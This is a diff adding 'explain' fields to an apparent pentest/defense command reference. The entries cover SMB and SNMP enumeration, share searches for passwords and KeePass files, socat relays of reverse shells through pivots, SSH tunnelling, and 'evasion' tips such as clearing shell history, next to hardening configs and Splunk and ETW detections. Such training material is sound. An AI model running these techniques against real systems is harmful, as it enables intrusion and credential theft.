         "secure_config": "# Deploy SilkETW for PPID spoofing detection:\nSilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot eventlog -l Microsoft-Windows-SilkETW\n\n# Deploy SilkETW for .NET injection detection:\nSilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot eventlog -l Microsoft-Windows-SilkETW\n\n# PowerShell to parse SilkETW JSON for PPID anomalies:\nGet-Content C:\\ETWLogs\\etw.json | ConvertFrom-Json |\n  Where-Object {$_.EventName -eq 'MSNT_SystemTrace/Process/Start'} |\n  Select-Object ProcessName, ProcessID, ParentProcessID, ImageFileName\n\n# Alert rule: ProcessName = cmd.exe or powershell.exe\n#   where ParentProcessID != expected parent (explorer.exe, svchost.exe)"
-      }
+      },
+      "explain": "Subscribes to an ETW provider and writes its events to JSON with SilkETW:\n  -t user                          collect from a user-mode provider\n  -pn Microsoft-Windows-Kernel-Process   the provider to consume (process telemetry)\n  -ot file                         output type: file\n  -p C:\\windows\\temp\\etw.json      the output path\nGives deeper telemetry than Sysmon (e.g. parent-PID spoofing, .NET assembly loads); parse the JSON with ConvertFrom-Json, and use -uk to set keyword flags for providers like DotNETRuntime."
     },
     {
       "id": "ad-silver-ticket",
@@ -73731,7 +73942,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Windows Registry - null sessions enabled:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RestrictAnonymous = 0      <-- allows null session enumeration\n#   RestrictAnonymousSAM = 0   <-- exposes SAM account list anonymously\n\n# SMB signing disabled (relay attack enabler):\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RequireSecuritySignature = 0\n#   EnableSecuritySignature  = 0\n\n# Verify current state:\nGet-SmbServerConfiguration | Select-Object EnableSMBQUIC,RequireSecuritySignature",
         "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled",
         "evasion": "Authenticate with valid creds so it blends with normal admin traffic; prefer wmiexec/atexec (no service creation) over psexec's noisy service-install path; avoid touching every host - target only what you need."
-      }
+      },
+      "explain": "Runs the full automated SMB/RPC enumeration suite:\n  ./enum4linux-ng.py <ip>   the modern enum4linux rewrite\n  -A                        run all checks (users, groups, shares, policy, OS)\nOne command gives a complete SMB picture; Impacket's samrdump.py is a focused alternative that dumps users via the SAMR interface."
     },
     {
       "id": "smb-mount-linux",
@@ -74049,7 +74261,8 @@ const COMMAND_DATA = {
           "label": "Enumerate users (null session)",
           "command": "rpcclient -U \"\" -N <ip> -c enumdomusers"
         }
-      ]
+      ],
+      "explain": "Enumerates a host over a null RPC session with rpcclient:\n  rpcclient -U \"\" <ip>   connect anonymously\nInteractive commands then enumerate the server (srvinfo), domains (enumdomains), shares (netshareenumall), and users (enumdomusers/queryuser); a RID-cycling for-loop recovers usernames even when direct enumeration is blocked."
     },
     {
       "type": "command",
@@ -74196,7 +74409,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Windows Registry - null sessions enabled:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RestrictAnonymous = 0      <-- allows null session enumeration\n#   RestrictAnonymousSAM = 0   <-- exposes SAM account list anonymously\n\n# SMB signing disabled (relay attack enabler):\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RequireSecuritySignature = 0\n#   EnableSecuritySignature  = 0\n\n# Verify current state:\nGet-SmbServerConfiguration | Select-Object EnableSMBQUIC,RequireSecuritySignature",
         "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled",
         "evasion": "Authenticate with valid creds so it blends with normal admin traffic; prefer wmiexec/atexec (no service creation) over psexec's noisy service-install path; avoid touching every host - target only what you need."
-      }
+      },
+      "explain": "Lists and reads SMB shares over a null session:\n  smbclient   the SMB client\n  -N          no password (null session)\n  -L //<ip>   list shares\nConnect to an interesting share (smbclient //<ip>/<share>) and use ls/get to pull files; smbmap and crackmapexec show per-share read/write permissions at a glance."
     },
     {
       "type": "command",
@@ -74287,7 +74501,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Lists SMB shares on a host with smbclient:\n  smbclient   the SMB client\n  -N          no password (null session)\n  -L \\\\<ip>   list the available shares\nShows what shares exist so you can connect to interesting ones (\\\\<ip>\\<share>) as guest or with -U <user>, then ls/get to pull files."
     },
     {
       "id": "smb-smbstatus",
@@ -74381,7 +74596,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Windows Registry - null sessions enabled:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RestrictAnonymous = 0      <-- allows null session enumeration\n#   RestrictAnonymousSAM = 0   <-- exposes SAM account list anonymously\n\n# SMB signing disabled (relay attack enabler):\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\n#   RequireSecuritySignature = 0\n#   EnableSecuritySignature  = 0\n\n# Verify current state:\nGet-SmbServerConfiguration | Select-Object EnableSMBQUIC,RequireSecuritySignature",
         "secure_config": "# Disable null sessions:\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' \\\n    -Name RestrictAnonymous -Value 2\nSet-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' \\\n    -Name RestrictAnonymous -Value 1\n\n# Enable SMB signing (blocks NTLM relay attacks):\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\n\n# GPO path:\n# Computer Config > Windows Settings > Security Settings > Local Policies > Security Options:\n#   'Microsoft network server: Digitally sign communications (always)' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts' = Enabled\n#   'Network access: Do not allow anonymous enumeration of SAM accounts and shares' = Enabled",
         "evasion": "Authenticate with valid creds so it blends with normal admin traffic; prefer wmiexec/atexec (no service creation) over psexec's noisy service-install path; avoid touching every host - target only what you need."
-      }
+      },
+      "explain": "Shows the local Samba server's live activity:\n  smbstatus   list current connections, open files, and locks\nConfirms which shares are in use and by whom; --shares and --processes narrow the view to connected shares or the smbd processes serving them."
     },
     {
       "id": "ad-smbmap",
@@ -74478,7 +74694,8 @@ const COMMAND_DATA = {
           "label": "Run a command (if admin)",
           "command": "smbmap -u <user> -p <password> -H <target> -x 'whoami'"
         }
-      ]
+      ],
+      "explain": "Enumerates SMB shares and your access with smbmap:\n  smbmap -u <user> -p <password>   authenticate\n  -d <domain>                      the domain\n  -H <target>                      the host to enumerate\nShows READ/WRITE per share; add -r '<share>' to list a share's contents, or use null creds (-u '' -p '') to test anonymous access - faster than manual smbclient browsing."
     },
     {
       "id": "smb-share-rw",
@@ -74681,7 +74898,8 @@ const COMMAND_DATA = {
           "label": "Search filenames for secrets",
           "command": "smbmap -u <user> -p <password> -H <target> -R --depth 5 -A '(password|cred|\\.kdbx)'"
         }
-      ]
+      ],
+      "explain": "Recursively lists the contents of an SMB share with smbmap:\n  -u/-p -d <domain>       credentials and domain\n  -H <target>             the host\n  --no-write-check        skip testing write access (faster)\n  -r <share>              recurse into this share\nMaps every file in a department/IT share so you can spot configs, scripts, and backups; add -A '<regex>' to auto-download matches, or --download '<path>' for a single file."
     },
     {
       "type": "command",
@@ -74819,7 +75037,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 - no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data - auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS - version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI - disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync - require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec - disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS - disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
-      }
+      },
+      "explain": "Interacts with SMTP over telnet to enumerate and test the server:\n  telnet <ip> 25   open a raw connection to the SMTP port\nGrab the banner with HELO/EHLO, enumerate users with VRFY <user> (valid vs unknown responses differ), and even send mail with MAIL FROM/RCPT TO/DATA; nmap's smtp-open-relay script checks for relaying."
     },
     {
       "id": "smtp-vrfy-python",
@@ -74910,7 +75129,8 @@ const COMMAND_DATA = {
           "MITRE T1087.003",
           "RFC 5321"
         ]
-      }
+      },
+      "explain": "A custom Python script automating SMTP VRFY user enumeration:\n  python3 smtp.py <user> <ip>   connect to the SMTP server and VRFY this username\nIt opens a socket, reads the banner, sends VRFY, and prints the response - scripting the manual nc/telnet check so you can loop a username list; a template for building your own protocol tooling."
     },
     {
       "id": "ad-snaffler",
@@ -75020,7 +75240,8 @@ const COMMAND_DATA = {
           "label": "Review high-signal (red) findings",
           "command": "# grep the log for creds/keys/config files"
         }
-      ]
+      ],
+      "explain": "Hunts shares across the domain for credentials and sensitive files:\n  Snaffler.exe   run from a domain-joined Windows host\n  -s             also print findings to the console\n  -d <domain>    the domain to enumerate shares in\n  -o snaffler.log   log file\n  -v data        verbosity: show the interesting data it finds\nUses built-in classifiers to flag files by name and content (keys, configs, passwords) at scale - point -i at a single host to scope it."
     },
     {
       "id": "snaffler",
@@ -75255,7 +75476,8 @@ const COMMAND_DATA = {
         "misconfiguration": "SNMP v1/v2c uses community strings (essentially cleartext passwords) for authentication. The default community string 'public' grants read access on many devices and is almost never changed. SNMPv3 with authentication+encryption is available but rarely deployed. SNMP exposes system information: OS version, running processes, network interfaces, installed software, routing tables - all useful for reconnaissance.",
         "vulnerable_config": "# snmpd.conf (Linux) - default public community with overly broad access:\nrocommunity public default\n# 'public' = world-readable SNMP, 'default' = from any source IP\n# Also: rwcommunity private  <-- write access with trivially guessed string\n\n# Windows SNMP service - default community 'public' with read permissions:\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities\n#   public = 4  (READ ONLY, but accessible to any host)",
         "secure_config": "# Option 1 - Disable SNMP entirely (if not needed):\nsystemctl stop snmpd && systemctl disable snmpd\n# Windows: Stop-Service SNMP; Set-Service SNMP -StartupType Disabled\n\n# Option 2 - Upgrade to SNMPv3 with auth+encryption:\n# /etc/snmp/snmpd.conf:\ncreateUser monuser SHA 'SecureAuthPass2024!' AES 'SecurePrivPass2024!'\nrouser monuser authPriv .1.3.6    # read-only, auth+priv required\n\n# Remove v1/v2c community access:\n#   Comment out or delete all rocommunity/rwcommunity lines\n\n# Firewall - restrict SNMP (UDP/161) to monitoring hosts only:\niptables -A INPUT -p udp --dport 161 -s 10.10.1.20 -j ACCEPT\niptables -A INPUT -p udp --dport 161 -j DROP"
-      }
+      },
+      "explain": "Walks SNMP to dump device and system data:\n  snmpwalk   traverse the MIB tree\n  -v2c       SNMP version 2c\n  -c public  the community string\n  <ip>       target\nReturns system info, processes, users, and sometimes credentials; brute-force the community string with onesixtyone first, then use braa to walk the OID tree fast."
     },
     {
       "type": "command",
@@ -75347,7 +75569,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Walks SNMP to dump device and system information:\n  snmpwalk   traverse the MIB tree\n  -v 2c      SNMP version 2c\n  -c public  the community string (try public, then private)\n  <ip>       the target\nReturns system info, users, running software, and sometimes credentials; append an OID (e.g. 1.3.6.1.2.1.1.5.0) to target one value, and brute-force community strings with onesixtyone."
     },
     {
       "id": "snmpwalk-windows-oids",
@@ -75479,7 +75702,8 @@ const COMMAND_DATA = {
           "MITRE T1087.001",
           "MITRE T1518"
         ]
-      }
+      },
+      "explain": "Walks Windows-specific SNMP OID branches for high-value recon:\n  snmpwalk -c <community> -v1 <ip>   the walker with community and version\n  1.3.6.1.4.1.77.1.2.25              the OID for local user accounts\nTargeting known OIDs (users, processes 1.3.6.1.2.1.25.4.2.1.2, installed software 25.6.3.1.2, TCP ports) extracts specific data fast instead of dumping the whole tree."
     },
     {
       "type": "command",
@@ -75638,7 +75862,8 @@ const COMMAND_DATA = {
           "MITRE T1046",
           "MITRE T1082"
         ]
-      }
+      },
+      "explain": "Dumps the SNMP MIB tree with a known community string:\n  snmpwalk   the walker\n  -c <community>   the validated community string\n  -v2c             SNMP version\n  <ip>             target\nReturns OS, running processes, users, installed software, interfaces, and the routing table; append an OID to target a specific branch and -t to raise the timeout on slow hosts."
     },
     {
       "id": "cdsa-m09-snort-fundamentals",
@@ -75734,7 +75959,8 @@ const COMMAND_DATA = {
       ],
       "lint_ignore": [
         "hardcoded-literal"
-      ]
+      ],
+      "explain": "Runs Snort 3 in passive IDS mode over a capture file:\n  -c ...snort.lua        the Lua master config\n  --daq-dir ...          where to load the packet-acquisition modules from\n  -r <pcap>              read packets from this capture instead of a live interface\n  -A cmg                 alert mode that prints alerts plus the packet payload to the console\nReports which rules the traffic triggers; use -R to load a custom local.rules file and -i <iface> to read a live interface instead."
     },
     {
       "id": "socat-bind-redirect",
@@ -75827,7 +76053,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy - direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering - block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring - detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection - detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Runs on the pivot to relay your connection to a bind shell on an internal target:\n  TCP4-LISTEN:<listen_port>   accept your incoming connection on the pivot\n  fork                        handle each connection in its own process (multiple clients)\n  TCP4:<target>:<bind_port>   forward it to the internal target's bind listener\nYou connect to the pivot's listen_port and reach the internal bind shell; here you initiate the connection (the reverse-redirect variant is for inbound callbacks)."
     },
     {
       "id": "socat-reverse-redirect",
@@ -75911,7 +76138,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy - direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering - block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring - detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection - detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Runs on the pivot to relay an inbound reverse shell back to your handler:\n  TCP4-LISTEN:<listen_port>       catch the payload's callback on the pivot\n  fork                            allow multiple simultaneous callbacks\n  TCP4:<attacker_ip>:<handler_port>   forward each one to your listener\nSet the payload's LHOST to the pivot so the shell reaches you through it - useful when the target cannot route directly to your attack host."
     },
     {
       "id": "socksoverrdp",
@@ -76022,7 +76250,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy - direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering - block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring - detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection - detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Registers the SocksOverRDP plugin to tunnel a SOCKS proxy through an existing RDP session's virtual channels:\n  regsvr32.exe SocksOverRDP-Plugin.dll   load the client plugin on the foothold\nAfter running SocksOverRDP-Server.exe on the next hop, a SOCKS listener appears on 127.0.0.1:1080 - pivot deeper without opening any new network ports."
     },
     {
       "type": "command",
@@ -76235,7 +76464,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Apply SPL for real intrusion detection scenarios."
         }
-      ]
+      ],
+      "explain": "A Splunk Processing Language search that counts process spawns by parent/child:\n  index=\"main\"                    which data store to search\n  sourcetype=\"WinEventLog:Sysmon\"  restrict to Sysmon logs\n  EventCode=1                     process-creation events\n  | stats count by ParentImage, Image   pipe results into a per-parent/child tally\nThe pipeline model (search then transform) drives all SPL hunting; swap stats for table, chart, rex, eval, transaction, or a subsearch as needed."
     },
     {
       "id": "cdsa-splunk-analytics-detection",
@@ -76332,7 +76562,8 @@ const COMMAND_DATA = {
           "rel": "prereq",
           "note": "SPL command reference for streamstats, eval, bin, and stats."
         }
-      ]
+      ],
+      "explain": "An SPL statistical hunt that flags network-connection outliers (beaconing) without a signature:\n  EventCode=3                       Sysmon network-connection events\n  bin _time span=1h                 bucket events into hourly windows\n  stats count ... by _time, Image   connections per hour per process\n  streamstats ... avg/stdev ...      rolling 24h mean and standard deviation per process\n  eval isOutlier=if(count > avg+0.5*stdev,1,0) | search isOutlier=1   keep only the anomalies\nSurfaces processes whose connection rate spikes above their own baseline - a lead on C2 beaconing or scanning."
     },
     {
       "id": "cdsa-splunk-data-exploration",
@@ -76420,7 +76651,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "After identifying data sources, apply intrusion detection queries."
         }
-      ]
+      ],
+      "explain": "An SPL query that lists every index holding data - the first step on an unknown Splunk instance:\n  | eventcount summarize=false index=*   count events per index across all indexes\n  | table index                          show just the index names\nTells you where data lives before you hunt; follow with '| metadata type=sourcetypes' and 'type=sources' to map what log types and hosts are available."
     },
     {
       "id": "cdsa-splunk-intrusion-detection",
@@ -76517,7 +76749,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Statistics-based anomaly detection to complement signature-based hunting."
         }
-      ]
+      ],
+      "explain": "An SPL detection for suspicious shell spawns via parent/child process chains:\n  EventCode=1                             Sysmon process-creation events\n  (Image=\"*cmd.exe\" OR Image=\"*powershell.exe\")   only shells being launched\n  | stats count by ParentImage, Image    group by who spawned what\nReveals odd parents (e.g. notepad.exe launching powershell.exe) that indicate injection or macro execution; the card extends this to DCSync (4662), LSASS access (EID 10), and CallTrace UNKNOWN shellcode."
     },
     {
       "type": "script",
@@ -81100,7 +81333,8 @@ const COMMAND_DATA = {
           "command": "ssh <user>@<ip> -p <port>",
           "label": "ssh -p"
         }
-      ]
+      ],
+      "explain": "Opens an interactive SSH session to a remote host:\n  ssh <user>@<ip>   authenticate as <user> and get a shell on <ip>\nGives you a terminal on the target; add -i <key> for key auth, -p <port> for a non-standard port, and the StrictHostKeyChecking=no options to skip the host-key prompt on throwaway lab hosts."
     },
     {
       "id": "ssh-dynamic-socks",
@@ -81216,7 +81450,8 @@ const COMMAND_DATA = {
           "label": "Background + no shell",
           "command": "ssh -f -N -D <socks_port> <user>@<pivot>"
         }
-      ]
+      ],
+      "explain": "Opens a SOCKS proxy over SSH, turning the pivot into a gateway into its internal networks:\n  -D <socks_port>   dynamic application-level forward (a local SOCKS proxy)\n  <user>@<pivot>    SSH into the pivot with these creds\nPoint proxychains at 127.0.0.1:<socks_port> to route any tool through the pivot; add -N -f to background the tunnel without opening a shell."
     },
     {
       "type": "command",
@@ -81324,7 +81559,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# IPMI cipher 0 - no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data - auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS - version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI - disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync - require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec - disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS - disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
         "evasion": "Use key/valid-cred auth so it blends with admin activity; avoid writing tools to disk - pipe commands over the session; clean shell history."
-      }
+      },
+      "explain": "Audits an SSH server's configuration and auth methods:\n  ./ssh-audit.py <ip>   fingerprint the server's key-exchange, cipher, and MAC algorithms\nFlags weak/deprecated crypto and the software version; a verbose connect ('ssh -v <user>@<ip>') then reveals which authentication methods (password, publickey, keyboard-interactive) the server accepts."
     },
     {
       "id": "ssh-local-forward",
@@ -81418,7 +81654,8 @@ const COMMAND_DATA = {
           "description": "Forward multiple ports in a single SSH connection - e.g. database on 1234 and web on 8080 simultaneously"
         }
       ],
-      "type": "command"
+      "type": "command",
+      "explain": "Forwards a local port through SSH to a service the pivot can reach:\n  -L <local_port>:localhost:<remote_port>   listen locally and tunnel to <remote_port> as seen from the pivot\n  <user>@<pivot>                             the SSH pivot host\nTraffic to your localhost:<local_port> emerges from the pivot to the target service; repeat -L to forward several ports in one session."
     },
     {
       "id": "ssh-remote-forward",
@@ -81517,7 +81754,8 @@ const COMMAND_DATA = {
           "label": "Reverse SOCKS (-R dynamic)",
           "command": "ssh -R <socks_port> <user>@<attacker>"
         }
-      ]
+      ],
+      "explain": "Forwards a pivot-side port back to a service on your attack host (the reverse of -L):\n  -R <pivot_ip>:<remote_port>:<bind_ip>:<local_port>   open remote_port on the pivot, tunnel it to bind_ip:local_port on your side\n  <user>@<pivot>   the SSH pivot host\n  -vN              verbose, and no remote shell (tunnel only)\nLets a deeper host reach a service (or handler) only your attack box runs, by connecting to the pivot's remote_port."
     },
     {
       "id": "sshuttle",
@@ -81615,7 +81853,8 @@ const COMMAND_DATA = {
           "label": "Exclude your own subnet",
           "command": "sudo sshuttle -r <user>@<pivot> <target_subnet> -x <your_subnet>"
         }
-      ]
+      ],
+      "explain": "Builds a transparent VPN-like tunnel over SSH so you reach an internal subnet with any tool, no proxychains:\n  sudo            needs root to adjust local routing\n  -r <user>@<pivot>   SSH into the pivot as the gateway\n  <target_subnet>     the internal network to route through it (e.g. 172.16.5.0/23)\n  -v                  verbose\nAfter it starts, tools like nmap/xfreerdp hit the subnet directly; the pivot only needs Python, and -x excludes subnets you must not route."
     },
     {
       "id": "ssi-injection",
@@ -81934,7 +82173,8 @@ const COMMAND_DATA = {
           "command": "openssl s_client -connect <host>:<port> 2>/dev/null | openssl x509 -noout -dates -subject -issuer",
           "label": "openssl"
         }
-      ]
+      ],
+      "explain": "Enumerates a host's SSL/TLS configuration:\n  sslscan <host>   connect and probe supported protocols, ciphers, and the certificate\nFlags weak protocols (SSLv3, TLS 1.0/1.1), weak ciphers, and expiring/self-signed certs; append :<port> for non-443 services and --show-certificate for full cert detail."
     },
     {
       "id": "ssrf-blind",
